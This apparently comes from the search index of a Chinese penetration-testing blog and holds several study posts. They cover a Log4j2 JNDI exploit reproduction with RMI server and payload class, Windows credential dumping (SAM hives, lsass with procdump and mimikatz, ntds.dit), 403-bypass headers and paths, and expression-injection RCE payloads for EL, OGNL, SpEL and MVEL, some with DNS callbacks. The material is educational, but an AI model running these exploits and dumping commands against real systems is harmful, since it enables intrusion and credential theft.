","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:0:0","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"简述 影响版本： Apache Log4j 2.x\u003c=2.15.0.rc1 影响范围： Spring-Boot-strater-log4j2Apache Struts2Apache SolrApache FlinkApache DruidElasticSearch Flume Dubbo Redis Logstash Kafka vmvare ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:1:0","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"漏洞原理 主要成因：log4j2提供的lookup功能 日志中包含 ${},lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。 log4j 2将基本的解析都做了实现： 常见解析： ${ctx:loginId} ${map:type} ${filename} ${date:MM-dd-yyyy} ${docker:containerId}${docker:containerName} ${docker:imageName} ${env:USER} ${event:Marker} ${mdc:UserId} ${java} ${jndi:logging/context-name} ${hostName} ${docker:containerId} ${k8s} ${log4j} ${main} ${name} ${marker} ${spring} ${sys:logPath} ${web:rootDir} 而其中的JNDI（Java Naming and Directory Interface, Java命名和目录接口）就是本次的主题了，t它提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器……. 也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成： ${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp} 其实JNDI通过SPI（Service Provider Interface）封装了多个协议，包括LDAP、RMI、DNS、NIS、NDS、RMI、CORBA。 ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:2:0","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"SpringBoot集成log4j2 ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:3:0","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"漏洞复现 ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:4:0","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"1.新建Maven项目，导入依赖 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003eMavenTest1\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003csource\u003e17\u003c/source\u003e \u003ctarget\u003e17\u003c/target\u003e \u003ccompilerArgs\u003e \u003carg\u003e--add-exports=jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED\u003c/arg\u003e \u003c/compilerArgs\u003e \u003c/configuration\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.0\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003cproperties\u003e \u003cmaven.compiler.source\u003e11\u003c/maven.compiler.source\u003e \u003cmaven.compiler.target\u003e11\u003c/maven.compiler.target\u003e \u003c/properties\u003e \u003c/project\u003e 编写log4j2配置文件: \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cConfiguration status=\"WARN\"\u003e \u003c!--全局参数--\u003e \u003cProperties\u003e \u003cProperty name=\"pattern\"\u003e%d{yyyy-MM-dd HH:mm:ss,SSS} %5p %c{1}:%L - %m%n\u003c/Property\u003e \u003cProperty name=\"logDir\"\u003e/data/logs/dust-server\u003c/Property\u003e \u003c/Properties\u003e \u003cLoggers\u003e \u003cRoot level=\"INFO\"\u003e \u003cAppenderRef ref=\"console\"/\u003e \u003cAppenderRef ref=\"rolling_file\"/\u003e \u003c/Root\u003e \u003c/Loggers\u003e \u003cAppenders\u003e \u003c!-- 定义输出到控制台 --\u003e \u003cConsole name=\"console\" target=\"SYSTEM_OUT\" follow=\"true\"\u003e \u003c!--控制台只输出level及以上级别的信息--\u003e \u003cThresholdFilter level=\"INFO\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/\u003e \u003cPatternLayout\u003e \u003cPattern\u003e${pattern}\u003c/Pattern\u003e \u003c/PatternLayout\u003e \u003c/Console\u003e \u003c!-- 同一来源的Appender可以定义多个RollingFile，定义按天存储日志 --\u003e \u003cRollingFile name=\"rolling_file\" fileName=\"${logDir}/dust-server.log\" filePattern=\"${logDir}/dust-server_%d{yyyy-MM-dd}.log\"\u003e \u003cThresholdFilter level=\"INFO\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/\u003e \u003cPatternLayout\u003e \u003cPattern\u003e${pattern}\u003c/Pattern\u003e \u003c/PatternLayout\u003e \u003cPolicies\u003e \u003cTimeBasedTriggeringPolicy interval=\"1\"/\u003e \u003c/Policies\u003e \u003c!-- 日志保留策略，配置只保留七天 --\u003e \u003cDefaultRolloverStrategy\u003e \u003cDelete basePath=\"${logDir}/\" maxDepth=\"1\"\u003e \u003cIfFileName glob=\"dust-server_*.log\" /\u003e \u003cIfLastModified age=\"7d\" /\u003e \u003c/Delete\u003e \u003c/DefaultRolloverStrategy\u003e \u003c/RollingFile\u003e \u003c/Appenders\u003e \u003c/Configuration\u003e ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:4:1","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"2.新建Log4Test类： 这里模拟站点会记录用户登陆日志，实际上大部分网站确实会做相关功能 package cn.xps.www; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.LogManager; public class Log4Test { private static final Logger logger = LogManager.getLogger(Log4Test.class); public static void main(String[] args) { // 避免因为Java版本过高而无法触发此漏洞 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); // String username = \"${jndi:rmi://192.168.43.161:8888/exp}\"; // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1 String username = \"${jndi:ldap://4fduwz.dnslog.cn}\"; // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1 logger.error(username + \"is login on ${java:os}\"); } } ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:4:2","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"3.打开dnslog，发现成功获取ip ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:4:3","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"4.搭建RMI（Remote Method Invoke）服务 因为RMI比较容易搭建环境 4.1 搭建 RMI 服务端，包含需要执行的恶意代码 RMI 服务端搭建，监听本地 8888（自定义）端口，用 Reference 类引用恶意对象 RMIServer.java package cn.xps.www; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(8888); System.out.println(\"Create RMI registry on port 8888\"); Reference reference = new Reference(\"cn.xps.www.Log4jRCE\", \"cn.xps.www.Log4jRCE\", null); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"exp\", referenceWrapper); } } 这里java8和以上是有区别的，可以看这篇文章： https://segmentfault.com/a/1190000041102850 https://segmentfault.com/q/1010000041102656 4.2 恶意对象模拟执行 cmd 打开计算器，并且输出一个语句用于标记执行处: Log4jRCE.java package cn.xps.www; public class Log4jRCE { static { try { System.out.println(\"exec in here\"); String [] cmd={\"Wireshark\"}; //命令自己修改 java.lang.Runtime.getRuntime().exec(cmd).waitFor(); }catch (Exception e){ e.printStackTrace(); } } } 4.5 执行 RMIServer，创建 RMI 服务。 ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:4:4","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"4.构建 EXP 触发目标服务器进行日志记录触发 JNDI 解析 Log4Test.java package cn.xps.www; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.LogManager; public class Log4Test { private static final Logger logger = LogManager.getLogger(Log4Test.class); public static void main(String[] args) { // 避免因为Java版本过高而无法触发此漏洞 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); String username = \"${jndi:rmi://192.168.43.161:8888/exp}\"; // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1 // String username = \"${jndi:ldap://4fduwz.dnslog.cn}\"; // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1 logger.error(username + \"is login on ${java:os}\"); } } 成功执行： ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:4:5","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"参考 https://hackt0.github.io/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E6%90%AD%E5%BB%BARMI%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%8C%E5%8C%85%E5%90%AB%E9%9C%80%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81 https://segmentfault.com/a/1190000041102850 https://segmentfault.com/q/1010000041102656 ","date":"2022-02-08","objectID":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:5:0","tags":["漏洞复现","log4j2","远程代码执行漏洞"],"title":"log4j2漏洞原理简单学习","uri":"/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"1.注册表提取 提取文件，Windows Server 2003或者Win XP 及以前需要提升到system权限，以后只要Administrator权限即可。 reg save hklm\\sam sam.hive reg save hklm\\system system.hive reg save hklm\\security secruity.hive 本地获取： # 如果要提取明文，请修改注册表 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 # 破解hash python ./secretsdump.py -sam ~/Desktop/sam.hive -security ~/Desktop/security.hive -system ~/Desktop/system.hive LOCAL ","date":"2022-02-08","objectID":"/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/:1:0","tags":["渗透测试","提取hash"],"title":"离线提取域控HASH的方法","uri":"/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"2.lsass.exe提取 procdump.exe -accepteula -ma lsass.exe lsass.dmp mimikatz#privilege::debug mimikatz#sekurlsa::minidump lsass.dmp mimikatz#sekrulsa::logonpasswords full ","date":"2022-02-08","objectID":"/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/:2:0","tags":["渗透测试","提取hash"],"title":"离线提取域控HASH的方法","uri":"/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"3.ntds.dit提取 ntdsutil snapshot \"activate instance ntds\" create quit quit ntdsutil snapshot \"mount {GUID}\" quit quit copy MOUNT_POINT\\windows\\ntds\\ntds.dit c:\\temp\\ntds.dit ntdsutil snapshot \"unmount {GUID}\" \"delete {GUID}\" quit quit ","date":"2022-02-08","objectID":"/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/:3:0","tags":["渗透测试","提取hash"],"title":"离线提取域控HASH的方法","uri":"/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"今天面试问到这个问题了，我大概是知道怎么利用，就是说不太出来…哎还是用文字总结一下吧！ ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:0:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"1.端口利用 扫描主机端口，找其它开放web服务的端口，访问其端口，挑软柿子。 ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:1:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"2.修改HOST **Host在请求头中的作用：**在一般情况下，几个网站可能会部署在同一个服务器上，或者几个 web 系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。 而很多WEB应用通过获取HTTP HOST头来获得当前请求访问的位置，但是很多开发人员并未意识到HTTP HOST头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。 修改客户端请求头中的 Host 可以通过修改 Host 值修改为子域名或者ip来绕过来进行绕过二级域名； 首先对该目标域名进行子域名收集，整理好子域名资产（host字段同样支持IP地址）。先Fuzz测试跑一遍收集到的子域名，这里使用的是Burp的Intruder功能。若看到一个服务端返回200的状态码，即表面成功找到一个在HOST白名单中的子域名。我们利用firefox插件来修改HOST值，成功绕过访问限制。 ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:2:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"3.覆盖请求 URL 尝试使用 X-Original-URL 和 X-Rewrite-URL 标头绕过 Web 服务器的限制。 通过支持 X-Original-URL 和 X-Rewrite-URL 标头，用户可以使用 X-Original-URL 或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL 中的路径，尝试绕过对更高级别的缓存和 Web 服务器的限制 Request GET /auth/login HTTP/1.1 Response HTTP/1.1 403 Forbidden Reqeust GET / HTTP/1.1 X-Original-URL: /auth/login Response HTTP/1.1 200 OK or Reqeust GET / HTTP/1.1 X-Rewrite-URL: /auth/login Response HTTP/1.1 200 OK ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:3:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"4.Referer 标头绕过 尝试使用 Referer 标头绕过 Web 服务器的限制。 介绍：Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源。 Request GET /auth/login HTTP/1.1 Host: xxx Response HTTP/1.1 403 Forbidden Reqeust GET / HTTP/1.1 Host: xxx ReFerer:https://xxx/auth/login Response HTTP/1.1 200 OK or Reqeust GET /auth/login HTTP/1.1 Host: xxx ReFerer:https://xxx/auth/login Response HTTP/1.1 200 OK ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:4:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"5.代理 IP 一般开发者会通过 Nginx 代理识别访问端 IP 限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host 等标头绕过 Web 服务器的限制。 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwared-Host: 127.0.0.1 X-Host: 127.0.0.1 X-Custom-IP-Authorization: 127.0.0.1 如： Request GET /auth/login HTTP/1.1 Response HTTP/1.1 401 Unauthorized Reqeust GET /auth/login HTTP/1.1 X-Custom-IP-Authorization: 127.0.0.1 Response HTTP/1.1 200 OK ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:5:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"6.扩展名绕过 基于扩展名，用于绕过 403 受限制的目录。 site.com/admin =\u003e 403 site.com/admin/ =\u003e 200 site.com/admin// =\u003e 200 site.com//admin// =\u003e 200 site.com/admin/* =\u003e 200 site.com/admin/*/ =\u003e 200 site.com/admin/. =\u003e 200 site.com/admin/./ =\u003e 200 site.com/./admin/./ =\u003e 200 site.com/admin/./. =\u003e 200 site.com/admin/./. =\u003e 200 site.com/admin? =\u003e 200 site.com/admin?? =\u003e 200 site.com/admin??? =\u003e 200 site.com/admin..;/ =\u003e 200 site.com/admin/..;/ =\u003e 200 site.com/%2f/admin =\u003e 200 site.com/%2e/admin =\u003e 200 site.com/admin%20/ =\u003e 200 site.com/admin%09/ =\u003e 200 site.com/%20admin%20/ =\u003e 200 ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:6:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"7.扫描的时候 遇到 403 了，上目录扫描工具，扫目录，扫文件（记住，扫描的时候要打开探测403，因为有些网站的目录没有权限访问会显示403，但是在这个目录下面的文件，我们或许能扫描到并访问 ） ","date":"2022-02-08","objectID":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/:7:0","tags":["渗透测试","403"],"title":"渗透测试如何利用403","uri":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8403/"},{"categories":["渗透测试"],"content":"简介 2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。 ","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:1:0","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"常用的表达式语言 ","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:2:0","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"JSP—JSTL_EL 基础 EL表达式(表达式语言)是一种在JSP中内置的语言(也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用)，可以用作用户访问页面的上下文以及不同作用域的对象，取得对象属性值或者执行简单的运算和判断操作：获取数据、执行运算、获取Web开发常用对象、调用Java方法。 JSP四大作用域： page：只在一个页面保存数据[javax.servlet.jsp.PageCotent] request：只在一个请求中保存数据[java.servlet.httpServletRequest] session：在一次会话中保存数据，仅供单个用户使用[javax.servlet.http.HttpSession] application：在整个服务器中保存数据，全部用户共享[javax.servlet.ServletContenxt] EL基础语法： 在JSP中，用${}表示此处为EL表达式。 在未指定作用域时，依次向后寻找； 在指定了作用域时，在范围内寻找：如${requestScope.name}表示在request作用域范围内获取name变量。 获取对象属性： 一种方法，为：${对象.属性}，如${param.name} 另一种为，：[]符号，如：${param[name]}，当属性名存在特殊字符时需要使用此方式 EL表达式也可以实例化Java的内置类： //如 Runtime.calss会执行系统命令 \u003cbody\u003e ${Runtime.getRuntime().exec(\"calc\")} \u003c/body\u003e \u003cspring:message text=\"${/\"/\".getClass().forName(/\"java.lang.Runtime/\").getMethod(/\"getRuntime/\",null).invoke(null,null).exec(/\"calc/\",null).toString()}\"\u003e \u003c/spring:message\u003e 简答来说，EL表达式是Java代码的简化版，用户可以通过可控的输入注入一段EL表达式执行代码。但用户难以控制EL表达式进行表达式注入。 渗透思路 获取webroot路径，exec执行命令echo写入一句话。 ","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:2:1","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"Struts2—OGNL 表达式格式： @[类全名（包括包路径）]@[方法名 | 值名]，例如： @java.lang.String@format('foo %s', 'bar') 基本用法： ActionContext AC = ActionContext.getContext(); Map Parameters = (Map)AC.getParameters(); String expression = \"${(new java.lang.ProcessBuilder('calc')).start()}\"; AC.getValueStack().findValue(expression)) 相关漏洞：s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017、。。。 ","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:2:2","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"Spring—SPEL SPEL（Spring表达式语言），是Spring框架专有的EL表达式 SpEL使用 #{…} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法 基本用法： //在jsp页面中可以使用el表达式代替\u003c%=%\u003e，之间访问java对象。 String expression = \"T(java.lang.Runtime).getRuntime().exec(/\"calc/\")\"; String result = parser.parseExpression(expression).getValue().toString(); 1.使用量表达式： \"#{Hello world}\" 2.使用java代码new/instance of Expression exp = parsee.parserExpression(\"new Spring('hello')\"); 3.使用T(type) 表示java.lang.Class实例： parse.parseExpression(T(Integer).MAX_VALUE) 使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} T()运算符的结果会返回一个java.lang.Math类对象。 代码审计关键字： org.springframework.expression.spel.standard SpelExpressionParser parserExpress expression.getValue() expression.setValue() ... SpEL漏洞 Spring为SpEL提供了两套不同的接口，分别是： SimpleEvaluationContext（更安全一些，推荐使用） StandardEvaluationContext：包含了SpEL的所有功能 漏洞原因： 开发人员未对用户输入进行处理就直接通过解析引擎对Spel继续解析。一旦用户能够控制解析的SpEL语句，便可以通过反射的方式构造代码执行的SpEL语句，从而达到RCE的目的。 例如： import org.springframework.expression.EvaluationContext; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.expression.spel.support.StandardEvaluationContext; public class TTTTT { public static void main(String []args) throws Exception { String expr = \"T(Runtime).getRuntime.exec(\\\"calc.exe\\\")\"; ExpressionParser parser = new SpelExpressionParser(); EvaluationContext evaluationContext = new StandardEvaluationContext(); Expression expression = parser.parseExpression(expr); System.out.println(expression.getValue(evaluationContext)); } } 常用POC： ${255*255} T(Thread).sleep(10000) T(java.lang.Runtime),getRuntime().exec('命令') T(java.lang.Runtime),getRuntime().exec('nslookup xxxxx.com') new java.lang.ProcessBuilder(\"命令\").start() new java.lang.ProcessBuilder(\"nslookup xxxxx.com\").start() #this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup xxxxx.com') 需要绕过黑名单校验，对于急于正则的匹配绕过是很简单的： 利用反射于拆分关键字构造Payload 利用ScriptEngineManner ","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:2:3","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"Elasticsearch——MVEL 基本用法： java import org.mvel.MVEL; public class MVELTest { public static void main(String[] args) { String expression = \"new java.lang.ProcessBuilder(/\"calc/\").start();\"; Boolean result = (Boolean) MVEL.eval(expression, vars); } } 